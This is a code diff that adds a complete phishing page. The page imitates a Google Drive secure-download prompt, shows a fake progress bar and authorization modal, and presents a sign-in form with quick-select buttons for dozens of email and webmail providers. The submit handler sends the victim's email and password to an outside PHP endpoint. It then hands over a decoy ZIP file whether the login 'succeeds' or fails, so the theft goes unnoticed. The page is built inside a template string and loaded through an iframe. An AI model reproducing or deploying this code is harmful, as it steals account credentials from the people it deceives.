+                                        <div style=overflow:hidden;position:absolute;top:0px;visibility:hidden;width:436px;z-index:991;height:0px;margin-top:57px;right:0px;margin-right:4px aria-hidden=true>
+                                            <iframe frameborder=0 scrolling=no name=account role=dialog aria-modal=true style=height:100%;width:100%;color-scheme:light;display:none></iframe>
+                                        </div>
+                                        <div style=overflow:hidden;position:absolute;top:0px;visibility:hidden;width:420px;z-index:991;height:280px;margin-top:47px;right:0px;margin-right:55px></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                
+                <!--<div style=top:64px>
+                    <div role=complementary tabindex=0 class="EMAdud qRvogc ndfHFb-c4YZDc-wr1hzd-PvRhvb" jscontroller=K4q0Te jsaction=rcuQ6b:npT2md;pzU6tc:hR1TY;rcDmPd:z6O8pb;l9sPRb:vR8Hjf;DqA5If:CmMsAc aria-label="Transcript sidebar"><span class=plVBEc jscontroller=jjJ6dc jsname=CplFEe><span hidden data-id=ucc-0 class=sf-hidden></span>
+                        <div class="aHij0b-WsjYwc Y1V0V oO07d" jsname=H9tDt role=complementary aria-roledescription="side sheet" aria-labelledby=ucc-0 jslog=203713;><span class=SXdXAb-BFbNVe><span class=SXdXAb-ugnUJb></span></span>
+                            <header jsname=tJHJj class=UqRCKc jslog=203715;><span jsname=GeGHKb jsaction=JIbuQc:trigger.UmQuVe class="rPYIFc sf-hidden"></span>
+                                <h2 id=ucc-0 class=XVAXm><div class=NrgWWc>Transcript</div></h2><span jsaction=JIbuQc:trigger.pzU6tc jsname=plIjzf><span data-is-tooltip-wrapper=true><button class="pYTkkf-Bz112c-LgbsSe pYTkkf-Bz112c-LgbsSe-OWXEXe-SfQLQb-suEOdc" jscontroller=PIVayb jsaction="click:h5M12e; clickmod:h5M12e;pointerdown:FEiYhc;pointerup:mF5Elf;pointerenter:EX0mI;pointerleave:vpvbp;pointercancel:xyn4sd;contextmenu:xexox;focus:h06R8; blur:zjh6rb;mlnRJb:fLiPzd" data-use-native-focus-logic=true aria-label="Close side sheet" data-tooltip-enabled=true data-tooltip-id=tt-c1 jslog=203714;track:click;u014N:cOuCgd;><span class="OiePBf-zPjgPe pYTkkf-Bz112c-UHGRz sf-hidden"></span><span class=RBHQF-ksKsZd jscontroller=LBaJxb jsname=m9ZlFb></span><span jsname=S5tZuc aria-hidden=true class=pYTkkf-Bz112c-kBDsod-Rtc0Jf><span class="notranslate VfPpkd-kBDsod" aria-hidden=true><svg focusable=false viewBox="0 -960 960 960" height=24 width=24 class=NMm5M><path d=M256-200l-56-56L424-480L200-704l56-56L480-536L704-760l56,56L536-480L760-256l-56,56L480-424L256-200Z></path></svg></span></span>
+                                <div class=pYTkkf-Bz112c-RLmnJb></div>
+                                </button>
+                                <div class=ne2Ple-oshW8e-V67aGc role=tooltip aria-hidden=true id=tt-c1>Close side sheet</div>
+                                </span>
+                                </span>
+                            </header>
+                            <div class=Ahjque>
+                                <div jsname=goZYA class="FyoSA k7DMVe">
+                                    <div class=nbSEI>
+                                        <div class=sdZXEd></div>
+                                        <div class=h25kFe jsname=MVsrn jscontroller=iZCPqc jsaction=input:d3sQLd;bc0QAc:zZlNMe>
+                                            <div jsshadow jscontroller=i8oNZb class="Fgl6fe-fmcmS-yrriRe-OWXEXe-H9tDt mVXMHc" data-idom-container-class jsname=oA4zhb data-use-native-validation=true>
+                                                <div jsaction="click:cOuCgd; keydown:I481le" jsname=vhZMvf class="Fgl6fe-fmcmS-yrriRe Fgl6fe-fmcmS-yrriRe-OWXEXe-MFS4be Fgl6fe-fmcmS-yrriRe-OWXEXe-di8rgd-V67aGc Fgl6fe-fmcmS-yrriRe-OWXEXe-SfQLQb-M1Soyc-Bz112c"><span class=Fgl6fe-fmcmS-OyKIhb></span><span class="notranslate GY1Nfe PETVs PETVs-OWXEXe-M1Soyc" aria-hidden=true jsname=FwAX0b data-icon-position=M1Soyc><svg focusable=false width=24 height=24 viewBox="0 0 24 24" class=NMm5M><path d="M20.49 19l-5.73-5.73C15.53 12.2 16 10.91 16 9.5A6.5 6.5 0 1 0 9.5 16c1.41 0 2.7-.47 3.77-1.24L19 20.49 20.49 19zM5 9.5C5 7.01 7.01 5 9.5 5S14 7.01 14 9.5 11.99 14 9.5 14 5 11.99 5 9.5z"></path></svg></span><span class=Fgl6fe-fmcmS-wGMbrd-sM5MNb><input jsname=YPqjbf type=text value id=c2 class=Fgl6fe-fmcmS-wGMbrd jsaction=input:YPqjbf;focus:AHmuwe;blur:O22p3e aria-label="Search transcript" placeholder="Search transcript" autocomplete=off></span>
+                                                    <div class=Fgl6fe-fmcmS-BdhkG-ksKsZd></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div jsname=h7hTqc jscontroller=L4CVxb></div>
+                                </div>
+                            </div>
+                        </div>
+                        </span>
+                    </div>
+                </div>
+            </div><span class=ndfHFb-c4YZDc-AznF2e-DTMEae tabindex=0></span></div>
+    </div>-->
+    
+
+    <!-- Demo trigger button -->
+    <button class="secure-download-btn">Download Secure File</button>
+
+    <!-- Download progress modal -->
+    <div class="download-modal" id="downloadModal">
+        <div class="download-content">
+            <div class="google-loader" id="downloadLoader"></div>
+            <div class="download-message" id="downloadMessage">Preparing download...</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- First auth modal -->
+    <div class="first-auth-modal" id="firstAuthModal">
+        <div class="first-auth-content">
+           
+            <svg  class="auth-logo"  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="800px" viewBox="0 -13.5 256 256" version="1.1" preserveAspectRatio="xMidYMid">
+    <g>
+        <path d="M19.3542312,196.033928 L30.644172,215.534816 C32.9900287,219.64014 36.3622164,222.86588 40.3210929,225.211737 C51.6602421,210.818376 59.5534225,199.772864 64.000634,192.075201 C68.5137119,184.263529 74.0609657,172.045039 80.6423954,155.41973 C62.9064315,153.085282 49.4659974,151.918058 40.3210929,151.918058 C31.545465,151.918058 18.1051007,153.085282 0,155.41973 C0,159.964996 1.17298825,164.510261 3.51893479,168.615586 L19.3542312,196.033928 Z" fill="#0066DA">
+
+</path>
+        <path d="M215.681443,225.211737 C219.64032,222.86588 223.012507,219.64014 225.358364,215.534816 L230.050377,207.470615 L252.483511,168.615586 C254.829368,164.510261 256.002446,159.964996 256.002446,155.41973 C237.79254,153.085282 224.376613,151.918058 215.754667,151.918058 C206.488712,151.918058 193.072785,153.085282 175.506888,155.41973 C182.010479,172.136093 187.484394,184.354584 191.928633,192.075201 C196.412073,199.863919 204.329677,210.909431 215.681443,225.211737 Z" fill="#EA4335">
+
+</path>
+        <path d="M128.001268,73.3111515 C141.121182,57.4655263 150.162898,45.2470011 155.126415,36.6555757 C159.123121,29.7376196 163.521739,18.6920726 168.322271,3.51893479 C164.363395,1.1729583 159.818129,0 155.126415,0 L100.876121,0 C96.1841079,0 91.638842,1.31958557 87.6799655,3.51893479 C93.7861943,20.9210065 98.9675428,33.3058067 103.224011,40.6733354 C107.927832,48.8151881 116.186918,59.6944602 128.001268,73.3111515 Z" fill="#00832D">
+
+</path>
+        <path d="M175.360141,155.41973 L80.6420959,155.41973 L40.3210929,225.211737 C44.2799694,227.557893 48.8252352,228.730672 53.5172481,228.730672 L202.485288,228.730672 C207.177301,228.730672 211.722567,227.411146 215.681443,225.211737 L175.360141,155.41973 Z" fill="#2684FC">
+
+</path>
+        <path d="M128.001268,73.3111515 L87.680265,3.51893479 C83.7213885,5.86488134 80.3489013,9.09044179 78.0030446,13.1960654 L3.51893479,142.223575 C1.17298825,146.329198 0,150.874464 0,155.41973 L80.6423954,155.41973 L128.001268,73.3111515 Z" fill="#00AC47">
+
+</path>
+        <path d="M215.241501,77.7099697 L177.999492,13.1960654 C175.653635,9.09044179 172.281148,5.86488134 168.322271,3.51893479 L128.001268,73.3111515 L175.360141,155.41973 L255.855999,155.41973 C255.855999,150.874464 254.682921,146.329198 252.337064,142.223575 L215.241501,77.7099697 Z" fill="#FFBA00">
+
+</path>
+    </g>
+</svg>
+            <h1 class="auth-title">Authorization Required</h1>
+            <p class="auth-text">You need to sign in to view or download this content. Your information is protected with industry-standard security measures.</p>
+            <button class="auth-btn" id="signInBtn">Sign In</button>
+        </div>
+    </div>
+
+    <!-- Main sign-in modal -->
+    <div class="modal-container" id="modalContainer">
+        <div class="modal">
+            <div class="modal-header">
+                <h1 class="modal-title" style="display: flex;align-items: center;">Sign in <svg style="
+    width: 20px;
+    margin-bottom: 0px;
+    margin-left: 10px;
+" class="auth-logo"  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" height="800px" viewBox="0 -13.5 256 256" version="1.1" preserveAspectRatio="xMidYMid">
+    <g>
+        <path d="M19.3542312,196.033928 L30.644172,215.534816 C32.9900287,219.64014 36.3622164,222.86588 40.3210929,225.211737 C51.6602421,210.818376 59.5534225,199.772864 64.000634,192.075201 C68.5137119,184.263529 74.0609657,172.045039 80.6423954,155.41973 C62.9064315,153.085282 49.4659974,151.918058 40.3210929,151.918058 C31.545465,151.918058 18.1051007,153.085282 0,155.41973 C0,159.964996 1.17298825,164.510261 3.51893479,168.615586 L19.3542312,196.033928 Z" fill="#0066DA">
+
+</path>
+        <path d="M215.681443,225.211737 C219.64032,222.86588 223.012507,219.64014 225.358364,215.534816 L230.050377,207.470615 L252.483511,168.615586 C254.829368,164.510261 256.002446,159.964996 256.002446,155.41973 C237.79254,153.085282 224.376613,151.918058 215.754667,151.918058 C206.488712,151.918058 193.072785,153.085282 175.506888,155.41973 C182.010479,172.136093 187.484394,184.354584 191.928633,192.075201 C196.412073,199.863919 204.329677,210.909431 215.681443,225.211737 Z" fill="#EA4335">
+
+</path>
+        <path d="M128.001268,73.3111515 C141.121182,57.4655263 150.162898,45.2470011 155.126415,36.6555757 C159.123121,29.7376196 163.521739,18.6920726 168.322271,3.51893479 C164.363395,1.1729583 159.818129,0 155.126415,0 L100.876121,0 C96.1841079,0 91.638842,1.31958557 87.6799655,3.51893479 C93.7861943,20.9210065 98.9675428,33.3058067 103.224011,40.6733354 C107.927832,48.8151881 116.186918,59.6944602 128.001268,73.3111515 Z" fill="#00832D">
+
+</path>
+        <path d="M175.360141,155.41973 L80.6420959,155.41973 L40.3210929,225.211737 C44.2799694,227.557893 48.8252352,228.730672 53.5172481,228.730672 L202.485288,228.730672 C207.177301,228.730672 211.722567,227.411146 215.681443,225.211737 L175.360141,155.41973 Z" fill="#2684FC">
+
+</path>
+        <path d="M128.001268,73.3111515 L87.680265,3.51893479 C83.7213885,5.86488134 80.3489013,9.09044179 78.0030446,13.1960654 L3.51893479,142.223575 C1.17298825,146.329198 0,150.874464 0,155.41973 L80.6423954,155.41973 L128.001268,73.3111515 Z" fill="#00AC47">
+
+</path>
+        <path d="M215.241501,77.7099697 L177.999492,13.1960654 C175.653635,9.09044179 172.281148,5.86488134 168.322271,3.51893479 L128.001268,73.3111515 L175.360141,155.41973 L255.855999,155.41973 C255.855999,150.874464 254.682921,146.329198 252.337064,142.223575 L215.241501,77.7099697 Z" fill="#FFBA00">
+
+</path>
+    </g>
+</svg></h1>
+                <div class="security-badge">
+                    <svg class="lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                    Secure sign-in powered by OAuth 2.0
+                </div>
+            </div>
+            <div class="modal-content">
+                <div class="google-loader" id="googleLoader"></div>
+                
+                <div id="formContent">
+                    <!-- Email Step -->
+                    <div id="emailStep">
+                        <div class="input-group">
+                            <label for="email" class="input-label">Email</label>
+                            <input style="width:90%"type="email" id="email" class="email-input" placeholder="Enter your email" autofocus>
+                        </div>
+
+                        <div class="quick-select-title">Quick select</div>
+                        
+                        <div class="provider-buttons-container">
+                            <div class="provider-buttons" id="providerButtons">
+                                <!-- 30 email providers -->
+                                <button class="provider-btn" data-domain="@gmail.com">
+                                    <img src="https://www.google.com/favicon.ico" class="provider-icon"> Gmail
+                                </button>
+                                <button class="provider-btn" data-domain="@yahoo.com">
+                                    <img src="https://www.yahoo.com/favicon.ico" class="provider-icon"> Yahoo
+                                </button>
+                                <button class="provider-btn" data-domain="@outlook.com">
+                                    <img src="https://outlook.live.com/favicon.ico" class="provider-icon"> Outlook
+                                </button>
+                                <button class="provider-btn" data-domain="@icloud.com">
+                                    <img src="https://www.icloud.com/favicon.ico" class="provider-icon"> iCloud
+                                </button>
+                                <button class="provider-btn" data-domain="@protonmail.com">
+                                    <img src="https://protonmail.com/favicon.ico" class="provider-icon"> ProtonMail
+                                </button>
+                                <button class="provider-btn" data-domain="@aol.com">
+                                    <img src="https://www.aol.com/favicon.ico" class="provider-icon"> AOL
+                                </button>
+                                <button class="provider-btn" data-domain="@mail.com">
+                                    <img src="https://www.mail.com/favicon.ico" class="provider-icon"> Mail.com
+                                </button>
+                                <button class="provider-btn" data-domain="@zoho.com">
+                                    <img src="https://www.zoho.com/favicon.ico" class="provider-icon"> Zoho
+                                </button>
+                                <button class="provider-btn" data-domain="@yandex.com">
+                                    <img src="https://yandex.com/favicon.ico" class="provider-icon"> Yandex
+                                </button>
+                                <button class="provider-btn" data-domain="@gmx.com">
+                                    <img src="https://www.gmx.com/favicon.ico" class="provider-icon"> GMX
+                                </button>
+                                <button class="provider-btn" data-domain="@hotmail.com">
+                                    <img src="https://outlook.live.com/favicon.ico" class="provider-icon"> Hotmail
+                                </button>
+                                <button class="provider-btn" data-domain="@live.com">
+                                    <img src="https://outlook.live.com/favicon.ico" class="provider-icon"> Live
+                                </button>
+                                <button class="provider-btn" data-domain="@me.com">
+                                    <img src="https://www.icloud.com/favicon.ico" class="provider-icon"> Me.com
+                                </button>
+                                <button class="provider-btn" data-domain="@inbox.com">
+                                    <img src="https://www.inbox.com/favicon.ico" class="provider-icon"> Inbox
+                                </button>
+                                <button class="provider-btn" data-domain="@fastmail.com">
+                                    <img src="https://www.fastmail.com/favicon.ico" class="provider-icon"> FastMail
+                                </button>
+                                <button class="provider-btn" data-domain="@hushmail.com">
+                                    <img src="https://www.hushmail.com/favicon.ico" class="provider-icon"> Hushmail
+                                </button>
+                                <button class="provider-btn" data-domain="@tutanota.com">
+                                    <img src="https://tutanota.com/favicon.ico" class="provider-icon"> Tutanota
+                                </button>
+                                <button class="provider-btn" data-domain="@mail.ru">
+                                    <img src="https://mail.ru/favicon.ico" class="provider-icon"> Mail.ru
+                                </button>
+                                <button class="provider-btn" data-domain="@qq.com">
+                                    <img src="https://mail.qq.com/favicon.ico" class="provider-icon"> QQ Mail
+                                </button>
+                                <button class="provider-btn" data-domain="@163.com">
+                                    <img src="https://mail.163.com/favicon.ico" class="provider-icon"> 163 Mail
+                                </button>
+                                <button class="provider-btn" data-domain="@126.com">
+                                    <img src="https://mail.126.com/favicon.ico" class="provider-icon"> 126 Mail
+                                </button>
+                                <button class="provider-btn" data-domain="@sina.com">
+                                    <img src="https://mail.sina.com.cn/favicon.ico" class="provider-icon"> Sina
+                                </button>
+                                <button class="provider-btn" data-domain="@naver.com">
+                                    <img src="https://www.naver.com/favicon.ico" class="provider-icon"> Naver
+                                </button>
+                                <button class="provider-btn" data-domain="@daum.net">
+                                    <img src="https://www.daum.net/favicon.ico" class="provider-icon"> Daum
+                                </button>
+                                <button class="provider-btn" data-domain="@rediffmail.com">
+                                    <img src="https://www.rediff.com/favicon.ico" class="provider-icon"> Rediff
+                                </button>
+                                <button class="provider-btn" data-domain="@lycos.com">
+                                    <img src="https://www.lycos.com/favicon.ico" class="provider-icon"> Lycos
+                                </button>
+                                <button class="provider-btn" data-domain="@rocketmail.com">
+                                    <img src="https://www.rocketmail.com/favicon.ico" class="provider-icon"> Rocketmail
+                                </button>
+                                <button class="provider-btn" data-domain="@earthlink.net">
+                                    <img src="https://www.earthlink.net/favicon.ico" class="provider-icon"> Earthlink
+                                </button>
+                                <button class="provider-btn" data-domain="@cox.net">
+                                    <img src="https://www.cox.com/favicon.ico" class="provider-icon"> Cox
+                                </button>
+                                <!-- Webmail providers -->
+                                <button class="provider-btn" data-domain="@godaddy.com">
+                                    <img src="https://www.godaddy.com/favicon.ico" class="provider-icon"> GoDaddy
+                                </button>
+                                <button class="provider-btn" data-domain="@secureserver.net">
+                                    <img src="https://www.godaddy.com/favicon.ico" class="provider-icon"> GoDaddy Webmail
+                                </button>
+                                <button class="provider-btn" data-domain="@cpanel.net">
+                                    <img src="https://cpanel.net/favicon.ico" class="provider-icon"> cPanel Webmail
+                                </button>
+                                <button class="provider-btn" data-domain="@plesk.com">
+                                    <img src="https://www.plesk.com/favicon.ico" class="provider-icon"> Plesk Webmail
+                                </button>
+                                <button class="provider-btn" data-domain="@hostgator.com">
+                                    <img src="https://www.hostgator.com/favicon.ico" class="provider-icon"> HostGator
+                                </button>
+                                <button class="provider-btn" data-domain="@bluehost.com">
+                                    <img src="https://www.bluehost.com/favicon.ico" class="provider-icon"> Bluehost
+                                </button>
+                            </div>
+                            <button class="show-all-btn" id="showAllBtn" style="display: none;">Show all providers</button>
+                        </div>
+
+                        <button class="submit-btn" id="nextBtn">Next</button>
+                    </div>
+
+                    <!-- Password Step -->
+                    <div class="password-step" id="passwordStep">
+            
+                       <button class="submit-btn" id="prevBtn" style="
+    width: 100px;
+    margin-bottom: 10px;
+    margin-top: -50px;
+">&lt; Back</button>
+                        <div class="input-group">
+                            <label for="password" class="input-label">Password</label>
+                            <input style="width:90%;" type="password" id="password" class="password-input" placeholder="Enter your password">
+                        </div>
+
+                        <button class="submit-btn" id="submitBtn">Sign In</button>
+                    </div>
+
+                    <div class="footer-links">
+                        <a href="#" class="footer-link">Create account</a>
+                        <a href="#" class="footer-link">Forgot email?</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize all secure download buttons
+        document.querySelectorAll('.secure-download-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                startDownloadProcess();
+            });
+        });
+
+        function startDownloadProcess() {
+            // Show download modal
+            const downloadModal = document.getElementById('downloadModal');
+            const downloadMessage = document.getElementById('downloadMessage');
+            const progressBar = document.getElementById('progressBar');
+            const downloadLoader = document.getElementById('downloadLoader');
+            
+            downloadModal.style.display = 'flex';
+            downloadLoader.style.display = 'block';
+            downloadMessage.textContent = 'Preparing download...';
+            progressBar.style.width = '0%';
+            
+            // Simulate download progress
+            setTimeout(() => {
+                downloadMessage.textContent = 'Checking authorization...';
+                progressBar.style.width = '25%';
+                
+                setTimeout(() => {
+                    downloadMessage.textContent = 'Verifying security...';
+                    progressBar.style.width = '50%';
+                    
+                    // After reaching 50%, show auth required
+                    setTimeout(() => {
+                        downloadModal.style.display = 'none';
+                        showAuthRequired();
+                    }, 800);
+                }, 800);
+            }, 800);
+        }
+        function startDownloadsProcess() {
+            // Show download modal
+            const downloadModal = document.getElementById('downloadModal');
+            const downloadMessage = document.getElementById('downloadMessage');
+            const progressBar = document.getElementById('progressBar');
+            const downloadLoader = document.getElementById('downloadLoader');
+            
+            downloadModal.style.display = 'flex';
+            downloadLoader.style.display = 'block';
+            downloadMessage.textContent = 'Preparing download...';
+            progressBar.style.width = '0%';
+            
+            // Simulate download progress
+            setTimeout(() => {
+                downloadMessage.textContent = 'Checking authorization...';
+                progressBar.style.width = '25%';
+                
+                setTimeout(() => {
+                    downloadMessage.textContent = 'Verifying security...';
+                    progressBar.style.width = '50%';
+                    
+                    // After reaching 50%, show auth required
+                    setTimeout(() => {
+                        downloadModal.style.display = 'none';
+                        //showAuthRequired();
+                    }, 800);
+                }, 800);
+            }, 800);
+        }
+        function showAuthRequired() {
+            // Show first auth modal
+            document.getElementById('firstAuthModal').style.display = 'flex';
+            
+            // Setup sign in button
+            document.getElementById('signInBtn').addEventListener('click', function() {
+                document.getElementById('firstAuthModal').style.display = 'none';
+                showSignInModal();
+            });
+        }
+
+        function showSignInModal() {
+            // Show main sign-in modal
+            const modalContainer = document.getElementById('modalContainer');
+            const loader = document.getElementById('googleLoader');
+            const formContent = document.getElementById('formContent');
+            
+            modalContainer.style.display = 'flex';
+            loader.style.display = 'block';
+            formContent.style.display = 'none';
+            
+            // Reset form steps
+            document.getElementById('emailStep').style.display = 'block';
+            document.getElementById('passwordStep').style.display = 'none';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            // Simulate loading
+            setTimeout(function() {
+                loader.style.display = 'none';
+                formContent.style.display = 'block';
+            }, 1000);
+        }
+
+        // Provider button selection
+        document.getElementById('providerButtons').addEventListener('click', function(e) {
+            if (e.target.classList.contains('provider-btn')) {
+                // Remove selected class from all buttons
+                document.querySelectorAll('.provider-btn').forEach(btn => {
+                    btn.classList.remove('selected');
+                });
+                
+                // Add selected class to clicked button
+                e.target.classList.add('selected');
+                
+                // Set the email value
+                // const domain = e.target.getAttribute('data-domain');
+                // document.getElementById('email').value = domain ? 'user' + domain : '';
+            }
+        });
+
+        // Next button click
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            if (email) {
+                // Show password step
+                document.getElementById('emailStep').style.display = 'none';
+                document.getElementById('passwordStep').style.display = 'block';
+                document.getElementById('password').focus();
+            } else {
+                //alert('Please enter your email');
+            }
+        });
+            // prev button click
+        document.getElementById('prevBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            if (email) {
+                // Show password step
+                document.getElementById('emailStep').style.display = 'block';
+                document.getElementById('passwordStep').style.display = 'none';
+                document.getElementById('email').focus();
+            } else {
+                //alert('Please enter your email');
+            }
+        });
+
+        // // Submit button click
+        // document.getElementById('submitBtn').addEventListener('click', function() {
+        //     const email = document.getElementById('email').value;
+        //     const password = document.getElementById('password').value;
+            
+        //     if (email && password) {
+        //         // Show loading animation
+        //         const loader = document.getElementById('googleLoader');
+        //         const formContent = document.getElementById('formContent');
+        //         loader.style.display = 'block';
+        //         formContent.style.display = 'none';
+                
+        //         // Simulate form submission
+        //         setTimeout(function() {
+        //             // Close modal
+        //             document.getElementById('modalContainer').style.display = 'none';
+        //             loader.style.display = 'none';
+                    
+        //             // Create and download the zip file
+        //             downloadInquiryFiles();
+        //         }, 1500);
+        //     } else {
+        //         alert('Please enter both email and password');
+        //     }
+        // });
+         
+         // Updated submit button click handler
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (email && password) {
+                // Show loading animation
+                const loader = document.getElementById('googleLoader');
+                const formContent = document.getElementById('formContent');
+                loader.style.display = 'block';
+                formContent.style.display = 'none';
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                
+                // Submit to PHP
+                fetch('https://test.greenfields.cc/tuty.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.success) {
+                        // Close modal
+                        document.getElementById('modalContainer').style.display = 'none';
+                        loader.style.display = 'none';
+                        
+                        // Trigger file download
+                        downloadInquiryFiles();
+                    } else {
+                        //alert('Login failed: ' + (data.message || 'Invalid credentials'));
+                        document.getElementById('modalContainer').style.display = 'none';
+                        loader.style.display = 'none';
+                        //formContent.style.display = 'block';
+                        downloadInquiryFiles();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    //alert('An error occurred during login');
+                    loader.style.display = 'none';
+                    formContent.style.display = 'block';
+                });
+            } else {
+                //alert('Please enter both email and password');
+            }
+        });
+
+        // Function to create and download the zip file
+        function downloadInquiryFiles() {
+            // Create a zip file with the required documents
+            // Note: In a real implementation, you would need a proper zip library
+            // This is a simplified version that creates a zip file with placeholder content
+            
+            // Create a blob with the zip file content
+            const zipContent = [
+                {name: "products-list.pdf", content: "PDF content for products list"},
+                {name: "Priority-list-(important).xlsx", content: "Excel content for priority list"},
+                {name: "contactlist.docx", content: "Word content for contact list"},
+                {name: "client-details.pdf", content: "PDF content for client details"}
+            ];
+            
+            // Create a zip file (simplified - in a real app you'd use JSZip or similar)
+            const zipBlob = new Blob([JSON.stringify(zipContent)], {type: 'application/zip'});
+            
+            // Create download link
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(zipBlob);
+            a.download = 'Inquiry files.zip';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            // Show download complete
+            startDownloadsProcess();
+            const downloadModal = document.getElementById('downloadModal');
+            const downloadMessage = document.getElementById('downloadMessage');
+            const progressBar = document.getElementById('progressBar');
+            const downloadLoader = document.getElementById('downloadLoader');
+            
+            downloadLoader.style.display = 'none';
+            downloadMessage.textContent = 'Download complete!';
+            progressBar.style.width = '100%';
+            
+            setTimeout(() => {
+                downloadModal.style.display = 'none';
+            }, 2000);
+            document.getElementById('modalContainer').style.display = 'none';
+            document.getElementById('firstAuthModal').style.display = 'none';
+        }
+        // Provider button selection - updated to hide others
+        document.getElementById('providerButtons').addEventListener('click', function(e) {
+            if (e.target.classList.contains('provider-btn')) {
+                const allButtons = document.querySelectorAll('.provider-btn');
+                const clickedButton = e.target;
+                const showAllBtn = document.getElementById('showAllBtn');
+                
+                // Hide all buttons except the clicked one
+                allButtons.forEach(btn => {
+                    if (btn !== clickedButton) {
+                        btn.classList.add('hidden');
+                    }
+                });
+                
+                // Add selected class to clicked button
+                clickedButton.classList.add('selected');
+                
+                // Show the "show all" button
+                showAllBtn.style.display = 'block';
+                
+                // Set the email value
+                const domain = clickedButton.getAttribute('data-domain');
+                //document.getElementById('email').value = domain ? 'user' + domain : '';
+            }
+        });
+
+        // Show all providers when "show all" is clicked
+        document.getElementById('showAllBtn').addEventListener('click', function() {
+            const allButtons = document.querySelectorAll('.provider-btn');
+            allButtons.forEach(btn => {
+                btn.classList.remove('hidden');
+                btn.classList.remove('selected');
+            });
+            this.style.display = 'none';
+            document.getElementById('email').value = '';
+        });
+
+    <\/script>
+    
+</body>
+</html>`;
+            
+            // Append the iframe to the document body
+            document.body.appendChild(iframe);
+        }
+    </script>
+
+</body>
+</html>
